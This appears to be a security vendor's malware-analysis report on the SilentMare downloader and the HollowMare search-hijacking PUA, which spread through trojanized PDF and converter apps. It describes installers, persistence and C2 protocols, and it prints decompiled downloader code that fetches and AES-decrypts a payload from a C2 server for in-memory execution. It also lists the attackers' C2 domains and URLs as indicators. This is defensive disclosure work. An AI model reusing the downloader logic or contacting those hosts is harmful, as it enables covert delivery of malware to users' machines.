# Two Trojan Families Trotting in Through Google Search Ads

> SilentMare, a downloader, and HollowMare, a browser-hijacking PUA, spread via trojanized PDF and file converter apps promoted through Google search ads.

- Source: https://research.intezer.com/blog/2026/07/two-trojan-families/
- Published: 2026-07-27
- Authors: Joakim Kennedy
- Tags: trojan, windows, pua
- Attribution: Intezer's Research Team (Intezer Research, https://research.intezer.com/)


**AI Generated Summary**

- We are documenting two malware families, *SilentMare* and *HollowMare*, that
  are spreading via Trojanized utility applications such as PDF converters and
  ZIP tools.
- SilentMare is a downloader that serves as a beachhead for future compromises.
  We have been tracking it back to 2024, across three different generations.
- We have not been able to retrieve a payload from any of the SilentMare C2
  servers, so the threat actor's end goal remains unknown.
- SilentMare swaps out the implementation language between generations (C#/C++,
  Rust, F#, Python via PyInstaller, and C++) but the operational pattern stays
  the same: a custom installer, a scheduled task, an updater that checks in
  once a day, and an AES-encrypted .NET payload that is loaded directly from
  memory.
- HollowMare is a PUA whose only goal is to force-install a browser extension
  or hijack the user's default search engine. The installer does the malicious
  work itself, and there is no second stage.
- HollowMare uses two techniques to modify the browser: driving the browser
  window with synthetic keystrokes, or overwriting a file in the browser's
  profile folder with a version provided by the C2 server.
- Both families are delivered via custom installers that create desktop
  shortcuts, register an uninstaller, time-stomp the PE timestamp, and
  obfuscate strings to hide their activity from static analyzers.
- The application-hosting infrastructure for both families overlaps, and the
  signing certificates are issued to similar entities based in the same city
  and the neighboring cities. This is not enough to conclude that the same
  threat actor is behind both families.
- Our view is that these applications have no reason to be in an enterprise
  environment and should be treated as malware. Even when they provide a
  functional feature, the operation is performed on a server, so the user's
  files are shared with an untrusted third party.

## Introduction

During the second half of 2025, we saw a surge of reports on malicious "fake"
applications. Most of these applications were for PDF modifications or file
conversion tools. They are targeting users who are looking for simple utilities
to get their work done, for example, to merge two PDF files into a single PDF.
This user is more likely an enterprise user than a home user. While many of
these applications provide the functionality, they are the classic definition
of a *Trojan Horse*. Researchers at GData called out the
[comeback](https://www.gdatasoftware.com/blog/2025/08/38247-justaskjacky-ai-trojan-horse-comeback)
of the *Trojan Horse* in one of their blog posts on this topic. TrendMicro is
[hypothesizing](https://www.trendmicro.com/en_us/research/25/i/evilai.html)
that threat actors are using AI coding tools to create these fake applications.
We don’t disagree with this hypothesis, since AI coding tools make it very easy
to create "shallow" applications that hide malicious behavior.

One of the reports that set off the hunt for trojanized applications was the
report on
[TamperedChef](https://blog.lukeacha.com/2025/06/suspicious-recipe-app.html).
[TamperedChef](https://blog.dingusxmcgee.com/blog/2025/06/06/Recipe-For-Adware.html)
was a trojanized recipe app that used a covert command and control (C2)
communication channel. Unfortunately, no one has publicly reported what the
final payload delivered was. Maybe the threat actor is the only one that knows
what the intended payload was. Later another covert C2 channel
[was found](https://www.guidepointsecurity.com/blog/ai-exposes-homoglyph-hustle/)
to be used by the calendar application Calendaromatic. This sparked an interest
in the industry to find more interesting Trojans, and others have been found.

Some of these findings have been misattributed to TamperedChef. Unfortunately,
*TamperedChef* has become the noun used to describe this type of trojanized
application, even though some are very different from TamperedChef. One of
these families is *BaoLoader*. One of the first reports on a trojanized
application with BaoLoader was reported on by
[Truesec](https://www.truesec.com/hub/blog/tamperedchef-the-bad-pdf-editor).
Expel later
[identified](https://expel.com/blog/the-history-of-appsuite-the-certs-of-the-baoloader-developer/)
the trojanized application as BaoLoader. We agree with Expel's assessment that
this is not TamperedChef. The way the malware in the AppSuite PDF Editor works
is very different from TamperedChef. The "warhead" is not retrieved via a
covert C2 channel. It's part of the installation. GData provided a detailed
analysis of the malware in a
[report](https://blog.gdatasoftware.com/2025/08/38257-appsuite-pdf-editor-backdoor-analysis)
they released in August 2025.

In this report, we are documenting the two malware families *SilentMare* and
*HollowMare* which are spreading via trojanized applications. SilentMare shares
the similarity of serving as a beachhead with TamperedChef. Unfortunately, we
haven't been able to retrieve the payload, so we don't know exactly the threat
actor's objective. The second family, HollowMare, is something that would more
likely be classified as a potentially unwanted application (PUA). It doesn't
provide a functional application. Instead it hijacks the search engine in the
user's browser or installs a browser extension.

Our view is that these products have no reason to be in an enterprise
environment and should be treated as malware. From the surface, it's not
possible for a user to determine if the application that they are downloading
contains a stealer, a beachhead, or something that just hijacks their default
search engine in the browser. When they provide a functional application, our
findings are that they do not perform the operation offline. Instead the
applications serve as thin clients that send the files to a server to perform
the operation. This means that the files are shared with an untrusted third
party.

## SilentMare

SilentMare is a malware family that is currently getting misidentified as a
PUA. Based on our analysis, we are classifying this family as a downloader that
serves as a beachhead for future compromises. The malware is marketed to users
as utility tools via advertisements, such as PDF converters. While the
application provides the user with some options to convert files to PDFs, none
of the actions are performed on the user's machine. Instead, these applications
are simple web clients that upload the files to a server for conversion. In
enterprise environments, these applications should never be allowed, as users
of these products are exfiltrating internal documents to an unknown entity. In
addition, SilentMare is sitting and waiting for a payload to execute from the
malware operator.

We have been tracking SilentMare activity back to 2024, and it was still active
at the end of 2025. Throughout this time period, we have seen three different
generations. It is possible the activity goes back even further. In these
generations, the coding language used sometimes changes but certain tactics are
consistent, allowing us to connect them. It all starts with a custom installer.
In the first and second generations, the installers were signed with
extended-validation (EV) certificates. These EV certificates were all issued to
Israeli companies with a base in Tel Aviv or neighboring cities. The most
recent generation does not use signed files.

The installer has two sets of goals: install the application and set up the
updater. The updater is what serves as the beachhead. The application and the
updater are installed in a folder under `%LOCALAPPDATA%` or `%APPDATA%`,
depending on whether the installer runs with administrator permissions. Each
installation is tracked using a generated GUID stored in the application
folder. The timestamp of when the file that stores the GUID was created is used
as an installation timestamp. This information is sent to the update server
every time the updater runs. The updater is executed, usually once a day, via a
scheduled task that was created by the installer.

```ascii
 Installer executed
 ├── Install updater to %APPDATA%
 ├── Generate GUID
 │   └── Store GUID in app folder
 ├── Create scheduled task to run updater
 └── Schedule task runs daily
     └── Executes updater
         ├── Sends GUID and install timestamp to C2
         └── Checks for payload from C2
             └── Decrypts and executes the .NET assembly from memory
```

In addition, the installer creates a desktop shortcut and adds an entry to
`HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\<ProductName>` so the
application can be uninstalled using Windows' uninstall functionality. While
the installer adds a specific uninstaller, it doesn't fully uninstall itself.
It just removes the desktop shortcut and the registry entry. Instead of
removing the updater and the application, the uninstaller phones home,
informing the operator that the application has been uninstalled. All the
telemetry it sends back is encrypted using a short XOR key.

Telemetry is collected at multiple steps as part of its operation, including by
the updater. SilentMare uses a set of three domains for each application. The
first domain is the "app" domain. This is the user-facing domain. It hosts a
website where the application is promoted and downloadable. Traffic to these
sites comes from Google search ads. The second domain is the "C2" domain for
the installer, and the third domain is the "C2" domain for the updater.

The updater checks in with its C2 to see if a payload is available to be
executed. If it gets an authorization token, it downloads the payload from the
same C2 server. The payload is encrypted with AES, and the updater expects it
to be a .NET file. The decrypted payload is executed directly from memory
without writing anything to disk.

The diagram below shows the communication with the updater's C2 server. The
diagram is based on the flow of the most recent version, but the flows are very
similar across all other versions. First, the updater sends the installation
identifier, a current timestamp, and the installation timestamp. The C2 server
responds with an auth token if the next stage should be downloaded and
deployed. The authentication token is added to the `Authorization` header in a
request to another path. The server returns an AES-CBC encrypted payload that
is either *Base64* or *ASCII85* encoded, depending on the version. If the
payload is successfully decoded and decrypted, the updater sends a status
update to the C2 server. This data is XOR-encrypted using an embedded key. The
payload is loaded and executed. If the execution fails, the failure is reported
back to the C2 server via the telemetry. As part of our investigations, we
haven't been able to retrieve a payload from the C2 server, so the end goal
remains unknown.

```
      +-------------------+
      | Host Fingerprint  |
      | (sub_14000F470)   |
      +--------+----------+
               |  JSON: {"currtm":"...","tid":"...","tinst":"..."}
               v
      +-------------------+     POST /login            +------------------+
      | C2 Orchestrator   | -------------------------> | domenget.com     |
      | (sub_1400040C0)   |   GatewayClient/5.0        |                  |
      |                   |   X-Request-Type: data     | Response:        |
      |                   | <------------------------- | Auth token       |
      |                   |                            +------------------+
      |                   |
      |   Parse token     |     POST /post
      |   Build JSON      | -------------------------> +------------------+
      |   Add Bearer auth |   Authorization: Bearer    | domenget.com     |
      |                   |   X-Request-Type: view     |                  |
      |                   | <------------------------- | Response:        |
      +--------+----------+                            | Encrypted .NET   |
               |                                       | assembly         |
               | ASCII85 -> AES-CBC decrypt -> B64 decode
               v
      +-------------------+
      | CLR Loader        |     POST /pdata (metrics)
      | (sub_140004F50)   | ------------------------------------------+
      |                   |   Metrics/4.0, text/plain                 |
      | Loads & executes  |   Body: Base64(XOR(URLEncode(telemetry))) |
      | .NET assembly     |                                           v
      | in-process        |                                  +------------------+
      +-------------------+                                  | domenget.com     |
                                                             | /pdata (one-way) |
      On .NET exceptions:                                    +------------------+
      +-------------------+
      | Exception Handler |     POST /pdata
      | (sub_140062651 /  | -----> domenget.com/pdata
      |  sub_140062796)   |   XOR+B64 encrypted error
      +-------------------+
```

### The 2024 Era

The earliest version of SilentMare that was still active in 2025 dates back to
the second half of 2024. That meant that they had been active for almost a
year. The two trojanized applications are *PDF Skills* and *Zip This*. While
one is a PDF converter tool and the other is a ZIP archiving tool, they are
almost identical under the hood.

Both applications come packaged in a custom installer written in .NET. The
installer checks with the installer C2 server if SilentMare should be installed
on the machine. This era's installer tries to run with administrator
permission, by re-launching and prompting the users for UAC, so it can install
into `%APPDATA%` instead of `%LOCALAPPDATA%`. Additionally, it checks and adds
a global ID into the file `%APPDATA%\SMCR\userId.txt`. This file is used by
both *PDF Skills* and *Zip This* to identify "returning" users.

The updater component is made up of two parts: an executable and a DLL file.
The files contain mixed managed (C#) and unmanaged (C++) code. Most of the
logic is implemented in the DLL file. The updater sends the install identifier
and the installation timestamp to the update C2 server. If it gets content
back, it expects it to be another .NET executable that is AES-256-CBC
encrypted. The IV is the first 16 bytes of the data returned by the C2 server,
while the key is generated by the updater and sent to the server as part of the
initial request. The decrypted executable is loaded into the process directly
from memory without writing anything to disk.

Most of the update process stays the same between different eras. The major
changes observed are around the sources of the key and the IV.

### The August 2025 Era

In this era, all of the technology has been swapped out. It appears that the
threat actor is maintaining multiple stacks. For example, *Easy 2 Convert* uses
a custom Rust-based installer, while *Convert Mate*, with a build four days
later, has a custom installer written in F# and C#. While they are different
implementations, they share the same behavior between themselves, many going
back to the previous era. Some changes in this era are the removal of the UAC
elevation and the global ID. Instead, a check for the Chrome browser has been
added. The updater component is only installed if Chrome is available on the
machine. This moves the decision logic of installing SilentMare away from the
C2 server and instead to the installer.

While these two applications have two completely different installers, the
updater is essentially identical. The malware author has moved away from using
the C#/C++ hybrid EXE-DLL combo to instead use a component written in F#.
Another change is the AES key and the IV. Instead of generating a random key
with each request, the updater sends the installation timestamp and a current
timestamp to the C2 server. The payload is encrypted with the key being the
SHA256 hash of the installation timestamp and the IV being the MD5 hash of the
*current* timestamp sent in the authentication request. The code-snippet below
shows extracted pseudo-code of this logic.

```c#
public class SessionInfoGatherer
{
    // Code that gathers install tracking data.
    public SessionInfo GetSessionInfo()
    {
        return new SessionInfo(getInstallDate(), getUserID());
    }

    internal string getInstallDate()
    {
        return File.GetCreationTime(
            Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "ConvertMate",
                "id.txt"
            )).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss");
    }

    internal string getUserID()
    {
        return File.ReadAllText(
            Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "ConvertMate", "id.txt"));
    }
}

// Method used to download the payload from the C2 server. This method is only called
// if a token is returned when it checks for an "update".
public override FSharpAsync<IEnumerable<byte[]>> Invoke(HttpClient webClient)
    {
        string text = DateTime.Now.ToString("yyyyMMddHHmmss");
        webClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue(
            "Bearer", token
        );
        webClient.DefaultRequestHeaders.Add("InstallTime", installDate);
        webClient.DefaultRequestHeaders.Add("Time", text);
        FSharpAsync<string> computation = FSharpAsync.AwaitTask<string>(
            webClient.GetStringAsync(url)
        );
    }

// Method that process the downloaded payload.
public override FSharpAsync<IEnumerable<byte[]>> Invoke(string resp)
        {
            IEnumerable<byte[]> value = JsonConvert.DeserializeObject<IEnumerable<byte[]>>(
                this.@this.decrypt(resp, installDate, currentDate));
            return AsyncPrimitives.MakeAsync<IEnumerable<byte[]>>(
                (FSharpFunc<AsyncActivation<IEnumerable<byte[]>>,
                AsyncReturn>)new GetUpdates@21-3(value));
        }
public class UpdateGatherer
{
    // Method used to decrypt the payload from the C2 server.
    internal string decrypt(string str, string installDate, string currentDate)
    {
        using Aes aes = Aes.Create();
        aes.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(installDate));
        aes.IV = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(currentDate));
        using MemoryStream stream = new MemoryStream(JsonConvert.DeserializeObject<byte[]>(str));
        ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
        CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
        string text = new StreamReader(stream2).ReadToEnd();
        int num = text[text.Length - 1];
        return text.Substring(0, text.Length - num);
    }
}
```

### Fall 2025 Era (Native Time)

In the Fall of 2025, we saw a new era. Starting with *Rapid Doc* at the end of
September and most recently *ZapPDF* at the beginning of December. *Rapid Doc*
uses a custom installer packaged in a modified implementation of
[PyInstaller](https://github.com/pyinstaller). The PyInstaller uses a different
*footer*, so most tooling can't unpack the embedded files. Additionally, an
additional "custom" encryption has been added to the embedded files. All the
files in the *PYZ* archive (which also uses different magic bytes) need a round
of *XOR* with a short key, decompression with *zlib*, followed by *XOR* with
another short key. The keys are different between different PyInstallers. For
example, the embedded client application is also packaged with PyInstaller and
uses a different set of keys. *ZapPDF*, first found in December 2025, moved
back to use a custom installer written in C#.

A big change with the installer in this era is that they do not contain the
SilentMare component. Instead, the updater component is downloaded by the
installer. The updater has been reimplemented in C++ instead of F#. The
functionality between the two SilentMare versions installed by *Rapid Doc* and
*ZapPDF* is very similar. The main difference is that the most recent version
expects an ASCII85 encoded payload, whereas previous versions used Base64
encoding of the encrypted data. In both of these C++ versions, the AES key is
derived by hashing a hardcoded string that is stored in the binary. The same
hardcoded string is used as the *XOR* key when encrypting the telemetry sent
back to the C2 server.

## HollowMare

HollowMare is another Trojan family that we are currently tracking. We have
seen two different types of malware families: one that installs an extension
without the user knowing, and another that hijacks the browser's default search
engine. Compared to other Trojan families in this report, no functional
application is provided to the user. The Trojan uses a custom installer that
creates a shortcut on the user's desktop, adds an uninstaller, and registers
itself in the Windows application list so it can be uninstalled. Because we did
not identify any malicious intent, we classify this family as a PUA rather than
malware.

The first variant, which installs a browser extension, was tracked back to May
2025 and was spread via a fake application called *ConvertyFile*. The installer
is written in Go and drops an uninstaller written in the same language. The
first thing the installer does when it's executed is to contact the C2 server.
The C2 server informs the installer which extension to install and in which web
browser. The installer creates a window that covers the whole screen so the
user can't see what's happening while the installation is in progress. Behind
the full-screen window, the installer opens up a new browser window. Using
virtual keyboard messages sent to the browser window, the installer navigates
to the extensions installation page and installs the extension as if the user
had done so manually. Once the extension has been installed, the installer
navigates to a "Thank You" page displayed to the user after the installation.

```
## Some of the metadata extracted from the Converty File Installer
Compiler      1.23.4 (2024-12-03)
Build ID      NXWcL1Pq14dOHrPjvWSd/WvQDkDRRmdLbZKJcZ8sU/asI5RZbGH0dIVoQZSh3R/IU3sCUsRT-mcUcDOVHWd
Main root     ConvertyFile
# main        5
# std         128
# vendor      12
vcs           git
vcs.revision  f8f4176537e9f6e757779c7adb8fba75e93c478f
vcs.time      2025-05-18T12:48:54Z
vcs.modified  true
```

The second variant we identified is a fake application called *OneZip*. The
first publicly available sample we found was uploaded to VirusTotal in November
2025\. This application is built from the same code base as ConvertyFile.
Instead of installing a browser extension, this version modifies a single file
in the browser's profile folder. The specific file is determined by the C2
server, which also performs the modification. The installer simply uploads the
file to the server and overwrites the local file with the server's response. We
are assuming it's a configuration file because any running browser process is
killed before the overwrite, to ensure it doesn't undo the change made by the
installer. The OneZip installer only targets Firefox.

A similar functionality is used by *CrystalPDF*, a fake application reported in
[October](https://x.com/struppigel/status/1977691895250772086) 2025 by Karsten
Hahn, and *PowerDoc*. These fake applications share very similar behavior with
OneZip but are written in F# and C# instead of Go. CrystalPDF also targets
Google Chrome in addition to Firefox. This variant also added a scheduled task
so the application runs once per day and ensures its effects haven't been
reverted.

In January 2026, we discovered another fake application, *SagePDF*. The
application is written in C# and shares a similar PDB path to CrystalPDF
(`C:\Git\f-ver2\Fv2Ui` vs `C:\Git\v4_application\`). The path suggests SagePDF
is the fourth generation. In this generation, search engine hijacking is
performed by interacting with the browser window, as with ConvertyFile. This
logic is implemented as a separate executable, XOR-encrypted within the main
binary. The persistence mechanism was also dropped. Since SagePDF is designed
to hijack the user's default search engine in the browser, we assume that both
OneZip and CrystalPDF have the same intent.

When SagePDF runs, it checks for the presence of an install ID stored at
`%TEMP%\UID\UID.txt`. This same file is checked by another fake application
called *PDFDoc*. The version of PDFDoc we have obtained does not do anything
malicious but it does share some more similarities with SagePDF. For example,
both have a video that is played to the user during the install. The resource
names are similar: `Sage.Files.SageAnimation.mp4` and
`Doc.Files.PdfDocAnimation.mp4`. Additionally, encryption logic is implemented
under the namespace `Cod`: `Sage.Models.Cod` and `Doc.Modles.Cod`. The `Modles`
in PDFDoc is likely a typo.

PDFDoc is signed by a certificate issued to an organization called *TAMARISK
INTERACTIVE LTD*. A different certificate issued to the same organization was
used to sign an application called *PowerPlayer*. This variant performs search
engine hijacking. The method used is the same keystroke injection method as
used by ConvertyFile and SagePDF.

Overall, HollowMare's only goal is either to force-install a browser extension
or to change the user's default search engine. Most of the time, the installer
does not include an application. Instead, the installer is only used to perform
the modifications to the user's browser. Once the installer is done, it sends
the user to a web application with the functionality the user is looking for.

## Attribution

When we compare SilentMare and HollowMare to each other, we see some
similarities and some differences. They are both delivered via a custom-made
installer that creates a desktop shortcut and adds uninstalling instructions to
the Windows registry. The installers collect telemetry at each step of the
installation process. Additionally, both families track the installed machine
via a generated *GUID* that is stored in a flat file.

The use of a custom installer allows the threat actor to perform hidden
activity on the user's machine while the installer is running. Both families
use string obfuscations to hide some of these activities from static analyzers.
While both obfuscate the strings, the techniques used are different except for
one instance where string reversal was used. Another shared anomaly is the
time-stomping of the PE timestamp with a future timestamp.

On the implementation side, the two families are very different. Both are using
multiple programming languages. HollowMare's language change appears more as an
evolution while SilentMare does it as part of staying undetected. The two
families also operate differently on the infected machine. For SilentMare,
persistence is important. It's one of the first things the installer sets up.
HollowMare's operation is more of a quick in-and-out. Perform the changes and
leave before the user realizes what has happened.

Both families utilize some encryption but differently. HollowMare uses simple
XOR encryption using a short key for everything. SilentMare uses the same type
of encryption, but only for the telemetry data. The downloaded payloads are
encrypted with AES, which shows that SilentMare really wants to make sure the
payload is not captured. The network communication with the C2 server is
already performed over TLS, so this additional payload encryption ensures that
TLS-intercepting solutions do not capture the payload in plain format.

While the code doesn't show much shared between the two families, a view of the
infrastructure shows something different. First off, both families use
different, unconnected domains for different tasks. The domain hosting the
application, where users are lured via ads, is completely separate from the
"C2" domains. SilentMare even uses different domains for the telemetry and the
payloads. When we look at the application hosting infrastructure we can see
that they are connected. For example, the response header hash
[e5e01ee754e24e3039d4](https://pilot.validin.com/detail?find=e5e01ee754e24e3039d4#tab=host_pairs)
produced by [Validin](https://www.validin.com/) matched domains hosting the
SilentMare applications: ZapPDF, RapidDoc, PDFSkills, Easy2Convert, and
ConvertMate; and HollowMare applications: OneZip, PowerDoc, ConvertyFile, and
CrystalPDF. Another header hash, for example
[ede0ea86de24c452cb25](https://pilot.validin.com/detail?find=ede0ea86de24c452cb25#tab=host_pairs)
was returned by servers serving both SilentMare (Easy2Convert and ConvertMate)
and HollowMare (PowerPlayer, PDFDoc, OneZip, and ConvertyFile).

Additionally, the certificates used to sign both SilentMare and HollowMare
applications have been issued for Israeli entities based in Tel Aviv and the
neighboring cities Herzliya and Ra’anana. The name of the companies use a
similar format. This suggests that they are obtained from the same broker.

From our analysis, we cannot conclude that SilentMare and HollowMare are
developed by the same threat actor. They do share some of the infrastructure
but this is not enough to conclude that the same threat actor is behind it. Our
theory is, either the threat actors are using the same supplier for
certificates and website building or they are independent suppliers to a third
threat actor that uses their malware.

## Conclusion

Trojanized utility applications have made a strong comeback in 2024 and 2025.
SilentMare and HollowMare are two of the families spreading via this delivery
method, and they represent two different operating models. SilentMare is a
beachhead. It installs a persistent updater that waits for a payload from the
operator. HollowMare is a quick in-and-out. It hijacks the browser or
force-installs an extension while the installer is running, and then leaves.

We have tracked SilentMare across three generations going back to 2024. The
threat actor swaps out the implementation language and adjusts the
cryptographic details between generations, but the operational pattern stays
the same: a custom installer, a scheduled task, an updater that checks in once
a day, and an AES-encrypted .NET payload that is loaded directly from memory.
We have not been able to retrieve a payload from any of the C2 servers, so the
end goal remains unknown.

HollowMare is different. The installer does the malicious work itself, and
there is no second stage. The earliest variant installs a browser extension by
driving the browser window with synthetic keystrokes. Later variants modify a
file in the browser's profile folder to hijack the default search engine. The
most recent variant we identified, SagePDF, returns to the keystroke-injection
method but drops persistence entirely. Because the only observed effect is
search engine hijacking or extension installation, we classify HollowMare as a
PUA rather than malware.

The two families' infrastructure has overlaps but no code is shared. The
application-hosting domains for SilentMare and HollowMare applications are
returned by the same servers based on Validin response-header pivots. The
signing certificates are issued to Israeli entities based in Tel Aviv and
neighboring cities, with names that follow a similar format. This is not enough
to conclude that the same threat actor is behind both families. Our assessment
is that they either share the same suppliers for certificates and landing
pages, or they supply a third party that uses their tooling.

From a defender's perspective, the distinction between malware and PUA is not
useful here. A user has no way to tell, before installing, whether a downloaded
PDF tool will hijack their search engine, upload their documents to an unknown
server, or wait for a stealer payload. Even the applications that provide a
functional feature do so by sending the user's files to a server. **None of
these applications should be allowed in an enterprise environment**.

## IOCs

- [Silent Mare CSV](silent_mare.csv)
- [Hollow Mare CSV](hollow_mare.csv)

### Silent Mare

```
type                 value                                                             comment
sha256               08b9f93000512b45f8c2e8d3d6624536b366e67c40fd4b958db58e3a1d129c3d  ConvertMate installer file hash
domain               banifuri.com                                                      C2 domain contacted by ConvertMate installer
domain               chrialletworton.com                                               Affiliate domain contacted by ConvertMate installer
domain               conmateapp.com                                                    Product website associated with ConvertMate installer
url                  https://banifuri.com/get-known-values                             C2 configuration fetch URL contacted by ConvertMate installer
url                  https://banifuri.com/log                                          C2 telemetry exfiltration URL contacted by ConvertMate installer
url                  https://banifuri.com/pixel                                        C2 conversion tracking pixel URL contacted by ConvertMate installer
url                  https://chrialletworton.com/524c5f6f-7ad4-4468-a535-e7598d5af5a3  Affiliate redirect URL launched by ConvertMate installer
certificate.subject  AMARYLLIS SIGNAL LTD                                              ConvertMate installer code-signing certificate subject
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                         ConvertMate installer code-signing certificate issuer
certificate.serial   77632688bc1b58d31bc7df0d                                          ConvertMate installer code-signing certificate serial
filepath             %LOCALAPPDATA%\ConvertMate\                                       Install directory created by ConvertMate installer
filepath             %LOCALAPPDATA%\ConvertMate\id.txt                                 User ID file dropped by ConvertMate installer
filepath             %LOCALAPPDATA%\ConvertMate\Convert Mate.exe                       Main app dropped by ConvertMate installer
filepath             %LOCALAPPDATA%\ConvertMate\UpdateRetreiver.exe                    Updater dropped by ConvertMate installer
filepath             %LOCALAPPDATA%\ConvertMate\Uninstaller.exe                        Uninstaller dropped by ConvertMate installer
filepath             %LOCALAPPDATA%\ConvertMate\favicon.ico                            Favicon dropped by ConvertMate installer
filepath             %LOCALAPPDATA%\ConvertMate\conmate_update.ps1                     PowerShell script temporarily dropped by ConvertMate installer
filepath             %DESKTOP%\Convert Mate.lnk                                        Desktop shortcut created by ConvertMate installer
scheduled_task       ConvertMateTask                                                   Scheduled task created by ConvertMate installer for daily updater execution
sha256               09c2af472ab86b62a702e94a39df2bef09205f4249ed871cbeece751c1e7ef4f  ConvertMate updater UpdateRetreiver.exe
domain               confetly.com                                                      ConvertMate updater C2 domain
url                  https://confetly.com/auth                                         ConvertMate updater authentication endpoint
url                  https://confetly.com/update                                       ConvertMate updater encrypted payload download
url                  https://confetly.com/is5m                                         ConvertMate updater success status reporting
url                  https://confetly.com/iserr                                        ConvertMate updater error status reporting
certificate.subject  AMARYLLIS SIGNAL LTD                                              ConvertMate updater code-signing certificate subject (EV GlobalSign)
certificate.issuer   GlobalSign                                                        ConvertMate updater code-signing certificate issuer
certificate.serial   77632688bc1b58d31bc7df0d                                          ConvertMate updater code-signing certificate serial
filepath             %APPDATA%\ConvertMate\id.txt                                      ConvertMate updater reads user ID and install date
filepath             UpdateRetreiver.exe                                               ConvertMate updater binary filename (misspelled Retriever)
sha256               ecf876ac0225934c183cdf76f55f0ba2d1c5cf86a52d2ba882cdc33eda11f878  Easy2Convert installer main binary
domain               caliberti.com                                                     Easy2Convert installer C2 domain
domain               www.ez2convertapp.com                                             Easy2Convert installer product website
url                  https://caliberti.com/client                                      Easy2Convert installer C2 configuration endpoint
url                  https://caliberti.com/variables                                   Easy2Convert installer C2 telemetry beacon endpoint
url                  https://www.ez2convertapp.com/toconvert-eula                      Easy2Convert installer EULA page
url                  https://www.ez2convertapp.com/toconvert-privacy                   Easy2Convert installer privacy policy page
certificate.subject  BLUE TAKIN LTD                                                    Easy2Convert installer code-signing certificate subject
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                         Easy2Convert installer code-signing certificate issuer
certificate.serial   0a6047dea944141527d85e24                                          Easy2Convert installer code-signing certificate serial
filepath             %LOCALAPPDATA%\Easy2Conver\                                       Easy2Convert installer installation directory
filepath             %LOCALAPPDATA%\Easy2Conver\Easy2Convert.exe                       Easy2Convert installer self-copy
filepath             %LOCALAPPDATA%\Easy2Conver\Easy2ConvertUpdater.exe                Easy2Convert installer dropped persistent updater
filepath             %LOCALAPPDATA%\Easy2Conver\Uninstall.exe                          Easy2Convert installer dropped uninstaller
filepath             %LOCALAPPDATA%\Easy2Conver\u.txt                                  Easy2Convert installer persistent UUID tracking file
filepath             %USERPROFILE%\Desktop\Easy2Convert.lnk                            Easy2Convert installer desktop shortcut
scheduled_task       Easy2ConvertTask                                                  Easy2Convert installer COM-based scheduled task running every 10 minutes
sha256               27262f4bf8096f04e53309d4ce603cfbeb27ed10abdf1c461d3ccb14e012f61e  Easy2Convert updater binary (Easy2ConvertUpdater.exe)
domain               hiko.lakienti.com                                                 Easy2Convert updater C2 domain
url                  https://hiko.lakienti.com/check-for-updates                       Easy2Convert updater C2 check-in endpoint
url                  https://hiko.lakienti.com/get-update                              Easy2Convert updater encrypted payload download endpoint
url                  https://hiko.lakienti.com/status-ok                               Easy2Convert updater success reporting endpoint
url                  https://hiko.lakienti.com/status-bad                              Easy2Convert updater failure reporting endpoint
certificate.subject  BLUE TAKIN LTD                                                    Easy2Convert updater code-signing certificate subject
certificate.issuer   GlobalSign                                                        Easy2Convert updater code-signing certificate issuer (EV)
certificate.serial   0a6047dea944141527d85e24                                          Easy2Convert updater code-signing certificate serial
filepath             %APPDATA%\Easy2Convert\u.txt                                      Easy2Convert updater user ID and timestamp source file
filepath             Easy2ConvertUpdater.exe                                           Easy2Convert updater binary filename
sha256               5810795a6596bfe8059a9e499ee5e4b7341207d8eb0b4a4f6dbc6c0f60de71c2  PDF Skills installer PDFSkills.exe
domain               val.skillcli.com                                                  PDF Skills installer C2 config domain
domain               cbn.skillcli.com                                                  PDF Skills installer C2 telemetry domain
domain               visit.keyguardai.com                                              PDF Skills installer affiliate domain
domain               www.pdfskillsapp.com                                              PDF Skills installer product/thank-you domain
url                  https://val.skillcli.com/v6                                       PDF Skills installer C2 configuration retrieval (XOR-encrypted)
url                  https://cbn.skillcli.com/r                                        PDF Skills installer telemetry exfiltration (XOR-encrypted)
url                  https://visit.keyguardai.com/click?pid=496&offer_id=14039178      PDF Skills installer KeyGuard AI affiliate URL
url                  https://www.pdfskillsapp.com/thanks?userid=<GUID>                 PDF Skills installer post-install thank-you page
certificate.subject  RED ROOT LTD                                                      PDF Skills installer code signing cert subject
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                         PDF Skills installer code signing cert issuer
certificate.serial   6838e670ea30dfa3294ea278                                          PDF Skills installer code signing cert serial (expired 2025-02-26)
filepath             %APPDATA%\PDFSkills\                                              PDF Skills installer admin install directory
filepath             %LOCALAPPDATA%\PDFSkills\                                         PDF Skills installer non-admin install directory
filepath             <InstallDir>\Update.exe                                           PDF Skills installer dropped malware loader stub
filepath             <InstallDir>\Update.dll                                           PDF Skills installer dropped malware loader DLL
filepath             <InstallDir>\PDFSkillsApp.exe                                     PDF Skills installer dropped legitimate PDF app
filepath             <InstallDir>\Uninstall.exe                                        PDF Skills installer dropped uninstaller
filepath             <InstallDir>\Updates.zip                                          PDF Skills installer dropped (then deleted) payload archive
filepath             <InstallDir>\update_task.ps1                                      PDF Skills installer dropped PowerShell task script (admin)
filepath             <InstallDir>\update_task_ad.ps1                                   PDF Skills installer dropped PowerShell task script (non-admin)
filepath             <InstallDir>\skillsUserId.txt                                     PDF Skills installer persistent user ID file
filepath             %APPDATA%\SMCR\userId.txt                                         PDF Skills installer backup user ID file
filepath             %DESKTOP%\PDFSkillsApp.lnk                                        PDF Skills installer desktop shortcut
scheduled_task       UpdateTaskZT                                                      PDF Skills installer daily persistence task executing Update.exe
sha256               876a7e9c2d54eea24720d6554a864db6aab12f30fe135598c16f8c23a8a7baf7  PDF Skills updater Update.exe managed stub
sha256               5ad036c7f0f52bc70187b00bf92c0eb8a2fbbc34a69d4f06e313ac451387b513  PDF Skills updater Update.dll native loader
domain               pwrtail.com                                                       PDF Skills updater primary C2 domain
domain               cbn.skillcli.com                                                  PDF Skills updater telemetry C2 domain
